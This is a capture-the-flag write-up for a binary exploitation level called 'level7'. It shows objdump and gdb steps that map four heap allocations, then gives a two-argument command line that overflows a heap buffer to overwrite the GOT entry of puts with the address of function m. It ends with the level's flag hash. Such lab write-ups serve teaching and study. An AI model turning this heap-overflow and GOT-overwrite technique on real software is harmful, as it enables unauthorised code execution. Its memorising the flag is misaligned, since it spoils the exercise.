# level7

## disassemble

```shell
objdump -dC -M intel level7
```

## Malloc

```shell
gdb level7
```

```shell
# 8048531:       e8 ba fe ff ff          call   80483f0 <malloc@plt>
# 8048536:       89 44 24 1c             mov    DWORD PTR [esp+0x1c],eax
(gdb)break *0x8048536
(gdb) info registers 
eax            0x804a008        134520840
```

```shell
# 804854b:       e8 a0 fe ff ff          call   80483f0 <malloc@plt>
# 8048550:       89 c2                   mov    edx,eax
(gdb)break *0x8048550
(gdb) info registers 
eax            0x804a018        134520856
```

```shell
# 8048560:       e8 8b fe ff ff          call   80483f0 <malloc@plt>
# 8048565:       89 44 24 18             mov    DWORD PTR [esp+0x18],eax
(gdb)break *0x8048565
(gdb) info registers 
eax            0x804a028        134520872
```

```shell
# 804857a:       e8 71 fe ff ff          call   80483f0 <malloc@plt>
# 804857f:       89 c2                   mov    edx,eax
(gdb)break *0x804857f
(gdb) info registers 
eax            0x804a038        134520888
```

## Exploit

```shell
(gdb) run $(python2.7 -c 'print("BBBB")') x
(gdb) x/42wx 0x804a008
    0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
    0x804a018:      0x42424242      0x00000000      0x00000000      0x00000011
    0x804a028:      0x00000002  --> 0x0804a038 <--  0x00000000      0x00000011
    0x804a038:      0x00000078      0x00000000      0x00000000      0x00020fc1
    0x804a048:      0xfbad240c      0x00000000      0x00000000      0x00000000
    0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a068:      0x00000000      0x00000000      0x00000000      0x00000000
    0x804a078:      0x00000000      0xb7fd1980      0xffffffff      0x00000000
    0x804a088:      0x00000000      0x00000000      0x0804a0e0      0xffffffff
    0x804a098:      0xffffffff      0x00000000      0x0804a0ec      0x00000000
    0x804a0a8:      0x00000000      0x00000000

# strcpy((char*)puVar3[1], *(char**)(param_2 + 8));
# stpcpy(char * dst, const char * src);
# char * dst --> 0x0804a038
# char * src --> argv[2]
```

```shell
# [...]
# 08048400 <puts@plt>:
#  8048400:       ff 25 28 99 04 08       jmp    *0x8049928
# [...]
# 080484f4 <m>:
#  80484f4:       55                      push   %ebp
# [...]

./level7 \
    $(python2.7 -c 'print("BBBB" * 5 + "\x28\x99\x04\x08")') \
    $(python2.7 -c 'print("\xf4\x84\x04\x08")')
```

# flag

```shell
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```